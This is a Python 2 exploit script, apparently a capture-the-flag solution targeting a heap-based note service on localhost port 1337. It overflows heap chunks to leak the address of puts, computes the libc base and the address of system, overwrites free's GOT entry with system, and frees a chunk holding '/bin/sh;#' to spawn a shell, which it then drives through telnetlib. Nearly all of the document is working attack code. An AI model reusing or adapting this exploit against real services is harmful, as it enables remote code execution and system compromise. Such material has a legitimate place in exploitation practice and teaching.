from struct import pack,unpack
from os import system
import socket
import time

def p(data) : 
	return pack("<Q",data)
def up(data) : 
	return unpack("<Q",data)

def new(data,sz) : 
	a = "new "+data*sz
	a+="\n"
	return str(a)
def show() : 
	a = "show\n"
	return str(a)

def free() : 
	id = raw_input()
	a = 'free '+id
	a +="\n"
	return str(a)

def modif(o) : 
	id = raw_input()
	#n  = raw_input("test")
	a = 'modif '+id+" "+p(system) 
	a +="\n"
	return str(a)

def modif1(o) : 
	id = raw_input()
	#n  = raw_input("test")
	a = 'modif '+id+" "+o
	a +="\n"
	return str(a)

def recv_until(st):
  ret = ""
  while st not in ret:
    ret += s.recv(2048)
  return ret
	
s = socket.socket()
s.connect(('localhost',1337))
raw_input()
print s.recv(1024)
s.send(new("A",0x100))
print s.recv(1024)
s.send(new("B",0x200))
print s.recv(2048)
s.send(new("C",0x100))
print s.recv(1024)
s.send(show())
print s.recv(2048)

s.send(free())
print s.recv(2048)
s.send(free())
print s.recv(2048)

s.send(new("A",0x107))
print s.recv(1024)
s.send(show())
s.send(show())
print s.recv(2048)
s.send(new("D",0x204)+p(0x3e91)+p(0x602018)+"F"*32)

#s.send(new("F",0x20))

print s.recv(2048)
s.send(show())
print s.recv(2048)
'''print "free F!"
s.send(free())
'''
x = s.recv(2048).replace(" ","")
print "x",x
x = x.split("=")
x =  x[2].split("\n")
a = x[0	]
a = a.ljust(8, "\x00")

'''s.send(show())
print s.recv(2048)'''
puts = int(hex(up(a)[0]),16)

#off = 0x83c30
off  = 0x82df0
libc_base = puts - off
system = libc_base + 0x46640
print "puts is at",hex(puts)
print "libc base  is at",hex(libc_base)
print "system is at",hex(system)
s.send(show())
print s.recv(2048)

s.send(modif(system))
s.send(show())
print s.recv(2048)
print "puts is at",hex(puts)
print "libc base  is at",hex(libc_base)
print "system is at",hex(system)



'''s.send(new("K",0x20))
print s.recv(2048)
s.send(show())
print s.recv(2048)'''
print "free is overwritten"
s.send(modif1("/bin/sh;#"))
print s.recv(1024)
print "free A!"
s.send(free())
'''print s.recv(1024)
s.send(show())
print s.recv(2048)'''

import telnetlib
t = telnetlib.Telnet()
t.sock = s
t.interact()
